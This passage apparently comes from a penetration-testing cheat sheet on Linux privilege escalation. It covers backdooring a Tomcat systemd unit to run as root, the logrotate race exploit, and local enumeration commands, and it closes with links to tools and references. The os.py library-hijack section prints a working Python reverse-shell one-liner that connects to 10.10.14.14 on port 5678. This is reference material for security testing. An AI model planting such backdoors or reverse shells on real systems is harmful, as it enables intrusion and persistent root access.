For example, if the machine is running a **tomcat** server and you can **modify the Tomcat service configuration file inside /etc/systemd/,** then you can modify the lines:

```text
ExecStart=/path/to/backdoor
User=root
Group=root
```

Your backdoor will be executed the next time that tomcat is started.

### Python library hijacking

If you know from **where** a python script is going to be executed and you **can write inside** that folder or you can **modify python libraries**, you can modify the os library and backdoor it \(if you can write where python script is going to be executed, copy and paste the os.py library\).

To **backdoor the library** just add at the end of the os.py library the following line \(change IP and PORT\):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### Logrotate exploitation

There is a vulnerability on `logrotate`that allows a user with **write permissions over a log file** or **any** of its **parent directories** to make `logrotate`write **a file in any location**. If **logrotate** is being executed by **root**, then the user will be able to write any file in _**/etc/bash\_completion.d/**_  that will be executed by any user that login.  
So, if you have **write perms** over a **log file** **or** any of its **parent folder**, you can **privesc** \(on most linux distributions, logrotate is executed automatically once a day as **user root**\). Also, check if apart of _/var/log_ there are more files being **rotated**.

More detailed information about the vulnerability can be found in this page [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

You can exploit this vulnerability with [**logrotten**](https://github.com/whotwagner/logrotten). 

## Internal Open Ports

You should check if any undiscovered service is running in some port/interface. Maybe it is running with more privileges that it should or it is vulnerable to some kind of privilege escalation vulnerability.

```bash
netstat -punta
ss -t; ss -u
```

## Sniffing

Check if you can sniff traffic. If you can, you could be able to grab some credentials.

```text
timeout 1 tcpdump
```

## Storage information

You can check the **storage information** using:

```text
df -h
```

There could be some **disks** that are **not mounted**

```bash
ls /dev | grep -i "sd"
cat /etc/fstab
lpstat -a# Check if there is any printer
```

## Check for weird executables

Just check the name of the binaries inside **/bin, /usr/bin, /sbin, /usr/sbin…** \(directories inside **$PATH**\)

## Other Tricks

### Exploiting services

[**NFS no\_root\_squash misconfiguration PE**](nfs-no_root_squash-misconfiguration-pe.md)

### **Searching added software without package manager**

```bash
for i in /sbin/* /; do dpkg --search $i >/dev/null; done #Use ir inside each folder of the path
```

## More linux enumeration

### Useful Software

```bash
which nc ncat netcat wget curl ping gcc make gdb base64 socat python python2 python3 perl php ruby xterm doas sudo fetch 2>/dev/null #Check for some interesting software
```

### Network information

```bash
cat /etc/hostname /etc/hosts /etc/resolv.conf 2>/dev/null #Known hosts and DNS
dnsdomainname 2>/dev/null
cat /etc/networks 2>/dev/null
ifconfig 2>/dev/null || ip a 2>/dev/null #Info about interfaces
iptables -L 2>/dev/null #Some iptables rules? access??
arp -e 2>/dev/null #Known neightbours
route 2>/dev/null #Network routes
netstat -punta 2>/dev/null #Ports
lsof -i #Files used by network services
```

### Users

```bash
gpg --list-keys #Do I have any PGP key?
```

### Files

```bash
ls -la $HOME #Files in $HOME
find /home -type f 2>/dev/null | column -t | grep -v -i "/"$USER #Files in home by not in my $HOME
find  /home /root -name .ssh 2>/dev/null -exec ls -laR {} \; #Check for .ssh directories and their content
```

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

#### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)\*\*\*\*

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)\(-t option\)  
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)  
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)  
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)  
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)  
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_  
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)  
**EvilAbigail \(physical access\):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)  
**Recopilation of more scripts**: [https://gh-dark.rauchg.now.sh/1N3/PrivEsc/tree/master/linux](https://gh-dark.rauchg.now.sh/1N3/PrivEsc/tree/master/linux)

### Bibliography

[https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)  
[https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)  
[https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)  
[http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)  
[https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)  
[https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)  
[https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)  
[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)  
[https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)



